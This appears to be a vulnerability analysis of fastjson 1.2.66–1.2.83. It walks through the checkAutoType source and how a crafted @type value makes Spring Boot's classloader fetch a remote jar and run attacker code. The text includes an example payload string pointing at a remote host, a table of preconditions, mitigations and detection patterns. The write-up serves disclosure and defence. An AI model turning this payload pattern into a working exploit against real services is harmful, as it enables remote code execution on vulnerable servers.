# Mechanism — fastjson `@JSONType` remote class load

## The vulnerable code

`com.alibaba.fastjson.parser.ParserConfig.checkAutoType(String typeName, Class<?> expectClass, int features)`
is called for every `@type` value, in **both** `JSON.parse(body)` and
`JSON.parseObject(body, SomeClass.class)`. Inside it (fastjson 1.2.66–1.2.83):

```java
// ... deny-list / accept-list / mapping checks above ...

boolean jsonType = false;
InputStream is = null;
try {
    String resource = typeName.replace('.', '/') + ".class";   // (1) attacker-controlled
    if (defaultClassLoader != null) {
        is = defaultClassLoader.getResourceAsStream(resource);  // (2) SSRF sink
    } else {
        is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);
    }
    if (is != null) {
        ClassReader classReader = new ClassReader(is, true);
        TypeCollector visitor = new TypeCollector("<clinit>", new Class[0]);
        classReader.accept(visitor);
        jsonType = visitor.hasJsonType();                       // (3) reads @JSONType
    }
} catch (Exception e) {
    // skip
} finally {
    IOUtils.close(is);
}

if (autoTypeSupport || jsonType || expectClassFlag) {
    boolean cacheClass = autoTypeSupport || jsonType;
    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);   // (4) defineClass
}

if (clazz != null) {
    if (jsonType) {
        if (autoTypeSupport) { TypeUtils.addMapping(typeName, clazz); }
        return clazz;                                           // (5) returns — skips deny + assignability
    }
    // ... ClassLoader/DataSource/RowSet hard-block, expectClass.isAssignableFrom, ...
}
```

## Why it is exploitable

1. **`typeName` is fully attacker-controlled** via `@type`, and `.replace('.','/')` turns it
   into a path/URL. `jar:http:..2130706433:18080.probe!.POC` becomes
   `jar:http://2130706433:18080/probe!/POC.class` (`2130706433` = `127.0.0.1` as an int; an
   integer host is required because dots become slashes).
2. **`getResourceAsStream` is an SSRF sink** when `defaultClassLoader` resolves `jar:http://`
   resource names. A plain JDK `AppClassLoader` does **not** — but Spring Boot's
   `LaunchedURLClassLoader` (present in every Spring Boot fat jar) **does**, fetching the
   remote jar.
3. The remote class carries **`@JSONType`**, so `hasJsonType()` returns true.
4. `jsonType == true` makes `TypeUtils.loadClass` run — **even with autoType disabled** — which
   `defineClass`es the attacker class. Its **static initializer runs = RCE**.
5. The `if (jsonType) return clazz` short-circuit skips the deny-list, the
   `DataSource`/`RowSet`/`ClassLoader` hard-block, and the `expectClass.isAssignableFrom`
   check. That last point is why **type-bound `parseObject(body, Dto.class)` is not a
   mitigation** — the RCE fires during the probe, before any binding/cast.

## Preconditions

| Condition | Why |
|---|---|
| fastjson **1.2.66 – 1.2.83** | the probe path is present/unchanged |
| classloader resolves `jar:http://` resource names | Spring Boot fat-jar `LaunchedURLClassLoader` qualifies; plain AppClassLoader does not |
| **JDK 8** | JDK 9+ rejects the crafted internal class name at `defineClass` → SSRF only |
| HTTP egress to the attacker | to fetch the remote jar |
| autoType **on or off** | irrelevant — the probe runs regardless |

## Fix / mitigation

- `-Dfastjson.parser.safeMode=true` (disables all autoType/`@type` handling)
- restrict outbound HTTP from application runtimes
- run on JDK 9+ (removes RCE, leaves SSRF)
- migrate to fastjson2 / remove fastjson 1.x from untrusted paths
- WAF/SIEM: alert on `@type` values containing `jar:`, `!`, `..`, or integer-IP literals
